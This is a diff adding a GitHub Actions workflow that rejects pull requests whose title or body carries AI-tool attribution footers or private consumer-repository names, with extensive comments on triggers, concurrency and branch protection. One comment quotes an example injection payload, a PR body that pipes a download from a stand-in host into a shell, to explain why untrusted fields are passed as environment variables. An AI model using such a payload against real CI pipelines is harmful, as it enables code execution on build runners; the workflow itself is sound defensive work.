@@ -1,0 +1,187 @@
+name: PR Metadata Policy
+
+# Policy checks whose INPUT is the pull request's metadata, not its code.
+#
+# Split out of the "Build and Test" job so that editing a PR title or body no
+# longer starts the full build, test, package and security pipeline on a head
+# commit whose content has not changed. Before the split, `edited` was in ci.yml's
+# trigger list purely so this gate re-ran on a body edit, and every such edit paid
+# for a two-minute build that inspected a commit range it already knew was clean.
+#
+# Ownership contract: this workflow is the ONE producer of the "PR metadata
+# policy" required check. ci.yml is the one producer of "Build and Test". Neither
+# reports under the other's name, so branch protection can never see two runs
+# competing to define the same context.
+#
+# The commit-message and commit-identity halves of the attribution gate stay in
+# ci.yml, because their input is the BASE..HEAD commit range, which only changes
+# when the code changes.
+
+on:
+  pull_request:
+    branches: [main]
+    # `synchronize` is here for a reason that is easy to get backwards, and this
+    # workflow shipped once without it. A new head commit cannot change the title
+    # or body, so on the face of it re-running this on every push is pure waste.
+    #
+    # But a required status check is evaluated against the check-runs attached to
+    # the HEAD COMMIT. Without `synchronize`, pushing to an open PR produces a head
+    # sha carrying no run of this workflow at all, so the required context has
+    # nothing to report and the PR blocks on a check that will never arrive.
+    # Measured on PR #159 before this line was added: head sha 03e75fd had a CI run
+    # and an AAHP Verify run and zero PR Metadata Policy runs.
+    #
+    # So this trigger is not about metadata changing. It is about keeping the
+    # contract satisfiable on every sha branch protection can ask about. The job is
+    # six seconds with no checkout, which is what makes that affordable.
+    types: [opened, edited, reopened, synchronize]
+
+permissions:
+  contents: read
+
+# Keyed on the PR number and scoped to THIS workflow, so a rapid series of body
+# edits collapses to the newest one, and a metadata edit can never cancel an
+# in-flight code-validation run: the two workflows do not share a group.
+#
+# cancel-in-progress stays TRUE, and the reasoning was checked against a live
+# measurement rather than assumed, because a `cancelled` conclusion under a
+# required check name is the state that blocked a merge on the v5.26.7 cut.
+#
+# Two edits two seconds apart on PR #159 (2026-08-20) produced exactly that pair:
+# run 32358446823 cancelled, run 32358449384 success, both named "PR metadata
+# policy" on head sha 6c74849. The PR reported mergeStateStatus=CLEAN, so GitHub
+# evaluated the NEWEST run for the context and the cancelled twin did not block.
+#
+# That is not luck, it is structural: cancel-in-progress only ever cancels a run
+# that a NEWER run in the same group has just superseded, and that newer run then
+# runs to completion (or is itself superseded, recursively). So the newest run for
+# this check name is never the cancelled one.
+#
+# Setting it to FALSE would be strictly worse. GitHub keeps at most one pending
+# run per group and cancels the previously pending one, so a third rapid edit
+# still yields a cancelled conclusion - and without in-progress cancellation two
+# runs can race, letting a run that inspected the OLDER body finish last. A stale
+# green on an attribution gate is a policy hole; a stuck merge is an annoyance.
+concurrency:
+  group: pr-metadata-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  metadata:
+    name: PR metadata policy
+    runs-on: ubuntu-latest
+    steps:
+      # No checkout. This job reads only the event payload, which is what makes it
+      # seconds rather than minutes, and means it cannot execute PR code.
+      #
+      # dependabot is exempt for the same reason aahp-verify.yml exempts it: its PR
+      # bodies quote upstream release notes verbatim, it cannot edit its own body,
+      # and this is a REQUIRED check with enforce_admins, so a trailer quoted
+      # upstream would hard-block a security update with no way out.
+      #
+      # The exemption is on the STEP, not the job, on purpose. A skipped JOB reports
+      # a non-success conclusion for its check context; keeping the job running and
+      # skipping the step means the required check always reaches a conclusive
+      # success, which is what branch protection needs.
+      - name: No AI attribution in PR title or body
+        if: github.actor != 'dependabot[bot]'
+        env:
+          # The PR title and body are attacker-controlled: anyone who can open a PR
+          # from a fork controls them. They MUST reach the script as environment
+          # variables. Never write ${{ github.event.pull_request.body }} inside a
+          # run: block - Actions substitutes the raw text into the script BEFORE
+          # bash parses it, so a body containing '; curl evil | sh; #' would execute
+          # on the runner. Below they are only ever read as quoted "$VAR", which
+          # bash never re-parses as code.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+        run: |
+          # POSIX-ERE twin of the aahp.config.json "ai-attribution" rule; grep -E has
+          # no (?:...) syntax, so the groups are plain (...). Keep the two in lockstep,
+          # and in lockstep with the commit-message copy in ci.yml.
+          # PROSE that merely describes a footer does not match, which is what keeps
+          # this gate from flagging its own definition and CONTRIBUTING.md's wording.
+          # Anchored on attribution PHRASING plus the anthropic no-reply address, not
+          # on the brand name, so this repo's legitimate threat intelligence about
+          # Claude-branded malware ("Claude Code leak campaign") does not trip it.
+          PATTERN='(generated|created|authored|assisted|written)[ \t]+(with|by)[ \t]+\[?[^ ]{0,20}claude|(co-authored|assisted|generated|created)-by:[^\n]*(claude|anthropic)|noreply@anthropic\.com|\[Claude Code\]\(|claude\.(com/claude-code|ai/code)'
+          fail=0
+
+          if printf '%s' "$PR_TITLE" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in PR title::Remove the tool/model attribution. The author of record is the human. See CONTRIBUTING.md."
+            fail=1
+          fi
+
+          if printf '%s' "$PR_BODY" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in PR body::Remove the 'Generated with Claude Code' footer from the PR body. This repo is public and PR bodies are indexed."
+            fail=1
+          fi
+
+          if [ "$fail" -ne 0 ]; then
+            exit 1
+          fi
+          echo "Attribution check OK: title and body carry no tool or model attribution."
+      # The rule this step enforces is written down in CONTRIBUTING.md, and a FILE
+      # copy of it already runs inside "Build and Test" as the
+      # `consumer-repo-disclosure` entry in aahp.config.json's forbiddenPatterns.
+      # That copy reads files. A pull request title and body are not files, so it has
+      # never been able to see them - and they are the surface that cannot be taken
+      # back. A merged PR body stays indexed for good, which is exactly why the three
+      # such bodies already in this repository had to be reported to the maintainer
+      # instead of fixed in place. The file rule closed the source of the next one;
+      # this closes the metadata source of the next one.
+      #
+      # Deliberately in THIS workflow rather than in ci.yml, for two reasons. It is
+      # the only workflow that runs on `edited`, which is the event a body rewrite
+      # produces - a gate in ci.yml would never see the edit that introduces the
+      # disclosure. And it puts this gate under a DIFFERENT required check name than
+      # the file gate it twins, so neither one going green for its own reasons can
+      # ever stand in for the other.
+      # Step-level exemption below, same shape and same reason as the step above:
+      # this is a required check with enforce_admins, dependabot quotes upstream
+      # release notes verbatim and cannot edit its own body, so a hyphenated upstream
+      # name in a quoted note would hard-block a security update with no way out.
+      # Skipping the STEP keeps the job's conclusion conclusive; skipping the JOB
+      # would report a non-success for the required context.
+      #
+      # The `if:` stays on the line directly under `- name:`, with no comment wedged
+      # between them, because workflow-trigger-contract.test.ts asserts that
+      # adjacency for both steps - that is what makes "exempted at step level" a
+      # machine-checked property rather than a claim in a comment.
+      - name: No consumer repository names in PR title or body
+        if: github.actor != 'dependabot[bot]'
+        env:
+          # Attacker-controlled, exactly as in the step above: anyone who can open a
+          # PR from a fork owns these two strings. They reach the script only as
+          # environment variables read as quoted "$VAR", never interpolated into the
+          # run: block, which bash would parse as code before it ever ran.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+        run: |
+          # POSIX-ERE twin of the aahp.config.json "consumer-repo-disclosure" rule.
+          # workflow-trigger-contract.test.ts asserts the two are byte-identical:
+          # drift means one published surface silently stops rejecting what the other
+          # still rejects, and nothing in a green build would say so.
+          #
+          # It matches the cross-repository reference SHAPE only and carries no list
+          # of private repository names, because such a list in a public file would
+          # itself be the disclosure it exists to prevent. The maintainer's contact
+          # address and the published npm scope are unaffected: neither is followed
+          # by a slash or a hyphen. Both are asserted as negative cases in the test.
+          DISCLOSURE_PATTERN='elvatis[/-][A-Za-z0-9]'
+          fail=0
+
+          if printf '%s' "$PR_TITLE" | grep -Eiq -- "$DISCLOSURE_PATTERN"; then
+            echo "::error title=Consumer repository named in PR title::Benchmark and measurement evidence carries counts and classes, never consumer repository names. See CONTRIBUTING.md."
+            fail=1
+          fi
+
+          if printf '%s' "$PR_BODY" | grep -Eiq -- "$DISCLOSURE_PATTERN"; then
+            echo "::error title=Consumer repository named in PR body::Write 'seven consumer repositories: 128 -> 92 findings' instead of listing them. This repo is public, PR bodies are indexed, and a merge cannot be retracted. See CONTRIBUTING.md."
+            fail=1
+          fi
+
+          if [ "$fail" -ne 0 ]; then
+            exit 1
+          fi
+          echo "Disclosure check OK: title and body name no consumer repository."
